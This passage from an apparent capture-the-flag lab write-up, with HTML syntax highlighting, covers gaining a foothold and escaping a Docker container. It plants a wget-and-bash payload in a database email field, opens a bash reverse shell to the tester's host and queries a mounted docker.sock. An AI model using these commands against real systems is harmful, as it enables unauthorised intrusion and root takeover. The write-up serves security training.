<span id="cb30-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 1 row affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.035</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb30-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Rows</span> matched: 1  Changed: 1  Warnings: 0</span></code></pre></div>
<p>Press <em>“VALIDATE”</em> to execute command:</p>
<p><img src="https://exploit.se/posts/2022-09-11-htb-writeup-extension/images/extension11.png" class="img-fluid"></p>
<p>Setup a reverse shell payload to get foothold on the docker container:</p>
<div class="sourceCode" id="cb31" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb31-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension echo <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"bash -i &gt;&amp; /dev/tcp/10.10.14.10/4488 0&gt;&amp;1"</span> <span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> rev.sh</span>
<span id="cb31-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension chmod +x rev.sh </span>
<span id="cb31-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension python3 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-m</span> http.server 80</span>
<span id="cb31-4"></span>
<span id="cb31-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">MySQL</span> <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">webapp</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span> update users set email = <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"&amp;wget -qO- http://10.10.14.10/rev.sh | bash&amp;"</span> where users.id = 895<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">;</span></span>
<span id="cb31-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Query</span> OK, 1 row affected <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">0.033</span> sec<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span>
<span id="cb31-7"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Rows</span> matched: 1  Changed: 1  Warnings: 0</span>
<span id="cb31-8"></span>
<span id="cb31-9"><span class="co" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">## PRESS 'VALIDATE'</span></span>
<span id="cb31-10"></span>
<span id="cb31-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">10.10.11.171</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span> [11/Sep/2022 18:31:18] <span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"GET /rev.sh HTTP/1.1"</span> 200 <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-</span></span>
<span id="cb31-12"></span>
<span id="cb31-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">➜</span>  extension nc <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-lvnp</span> 4488</span>
<span id="cb31-14"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">listening</span> on <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">any</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> 4488 ...</span>
<span id="cb31-15"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">connect</span> to <span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">[</span><span class="ss" style="color: #20794D;
background-color: null;
font-style: inherit;">10.10.14.10</span><span class="pp" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span> from <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">UNKNOWN</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[10.10.11.171]</span> 53454</span>
<span id="cb31-16"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> cannot set terminal process group <span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">46</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="bu" style="color: null;
background-color: null;
font-style: inherit;">:</span> Inappropriate ioctl for device</span>
<span id="cb31-17"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">bash:</span> no job control in this shell</span>
<span id="cb31-18"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/var/www/html/public$</span> id</span>
<span id="cb31-19"><span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">uid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">gid</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span> <span class="va" style="color: #111111;
background-color: null;
font-style: inherit;">groups</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">=</span>1000<span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,999</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">app</span><span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span></span></code></pre></div>
</section>
<section id="step-3-1" class="level3">
<h3 class="anchored" data-anchor-id="step-3-1">Step 3</h3>
<p>Upload <code>deepce.sh</code> and enumerate the container.</p>
<div class="sourceCode" id="cb32" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb32-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> wget http://10.10.14.10/deepce.sh</span>
<span id="cb32-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> chmod +x deepce.sh</span>
<span id="cb32-3"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> bash deepce.sh</span>
<span id="cb32-4"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb32-5"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Dangerous Capabilities .. Yes</span>
<span id="cb32-6"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">cap_dac_override</span></span>
<span id="cb32-7"></span>
<span id="cb32-8"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[...</span> snip ...]</span>
<span id="cb32-9"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">====================================</span><span class="er" style="color: #AD0000;
background-color: null;
font-style: inherit;">(</span> <span class="ex" style="color: null;
background-color: null;
font-style: inherit;">Enumerating</span> Mounts <span class="kw" style="color: #003B4F;
background-color: null;
font-weight: bold;
font-style: inherit;">)</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">====================================</span></span>
<span id="cb32-10"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[+]</span> Docker sock mounted ....... Yes</span>
<span id="cb32-11"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">The</span> docker sock is writable, we should be able to enumerate docker, create containers </span>
<span id="cb32-12"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">and</span> obtain root privs on the host machine</span>
<span id="cb32-13"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">See</span> https://stealthcopter.github.io/deepce/guides/docker-sock.md</span></code></pre></div>
<p>Lets try to escape through the mounted docker socket.</p>
<div class="sourceCode" id="cb33" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb33-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> find / <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-name</span> docker.sock <span class="dv" style="color: #AD0000;
background-color: null;
font-style: inherit;">2</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">&gt;</span>/dev/null    </span>
<span id="cb33-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">/app/docker.sock</span></span></code></pre></div>
<p>Google for <em>“exploit docker sock”</em> and the <a href="https://gist.github.com/PwnPeter/3f0a678bf44902eae07486c9cc589c25">first hit</a> is a nice bash script to escape. Follow the script step-by-step.</p>
<ol type="1">
<li>Find available images:</li>
</ol>
<div class="sourceCode" id="cb34" style="background: #f1f3f5;"><pre class="sourceCode bash code-with-copy"><code class="sourceCode bash"><span id="cb34-1"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">application@4dae106254bf:/dev/shm$</span> curl <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">-s</span> <span class="at" style="color: #657422;
background-color: null;
font-style: inherit;">--unix-socket</span> /app/docker.sock http://localhost/images/json</span>
<span id="cb34-2"><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">[</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1656086146</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:b97d15b16a2172a201a80266877a65a44b0d7fa31c29531c20cdcc8e98c2d227"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"io.webdevops.layout"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"io.webdevops.version"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1.5.0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"maintainer"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"info@webdevops.io"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"vendor"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"WebDevOps.io"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:762bfd88e0120a1018e9a4ccbe56d654c27418c7183ff4a817346fd2ac8b69af"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:null</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"laravel-app_main:latest"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1975239137</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1975239137}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1655515586</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:ca37554c31eb2513cf4b1295d854589124f8740368842be843d2b4324edd4b8e"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"io.webdevops.layout"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"8"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"io.webdevops.version"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"1.5.0"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"maintainer"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"info@webdevops.io"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"vendor"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"WebDevOps.io"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:null</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"webdevops/php-apache:7.4"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1028279761</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1028279761}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1640902141</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:6af04a6ff8d579dc4fc49c3f3afcaef2b9f879a50d8b8a996db2ebe88b3983ce"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"maintainer"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Thomas Bruederli &lt;thomas@roundcube.net&gt;"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"roundcube/roundcubemail@sha256:f5b054716e2fdf06f4c5dbee70bc6e056b831ca94508ba0fc1fcedc8c00c5194"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"roundcube/roundcubemail:latest"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:612284073</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:612284073}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1640805761</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:c99e357e6daee694f9f431fcc905b130f7a246d8c172841820042983ff8df705"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:null</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">""</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoDigests"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"composer@sha256:5e0407cda029cea056de126ea1199f351489e5835ea092cf2edd1d23ca183656"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"RepoTags"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:[</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"composer:latest"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">]</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"SharedSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Size"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:193476514</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"VirtualSize"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:193476514}</span><span class="ex" style="color: null;
background-color: null;
font-style: inherit;">,</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Containers"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:-1</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Created"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:1640297121</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Id"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"sha256:cec4e9432becb39dfc2b911686d8d673b8255fdee4a501fbc1bda87473fb479d"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"Labels"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:{</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.authors"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"The Docker Mailserver Organization on GitHub"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.description"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"A fullstack but simple mail server (SMTP, IMAP, LDAP, Antispam, Antivirus, etc.). Only configuration files, no SQL database."</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.documentation"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"https://github.com/docker-mailserver/docker-mailserver/blob/master/README.md"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.licenses"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"MIT"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.revision"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"061bae6cbfb21c91e4d2c4638d5900ec6bee2802"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.source"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"https://github.com/docker-mailserver/docker-mailserver"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.title"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"docker-mailserver"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.url"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"https://github.com/docker-mailserver"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.vendor"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"The Docker Mailserver Organization"</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"org.opencontainers.image.version"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">:</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"refs/tags/v10.4.0"</span><span class="dt" style="color: #AD0000;
background-color: null;
font-style: inherit;">}</span><span class="op" style="color: #5E5E5E;
background-color: null;
font-style: inherit;">,</span><span class="st" style="color: #20794D;
background-color: null;
font-style: inherit;">"ParentId"</span><span class="dt" style="color: #AD0000;
background-color: null;
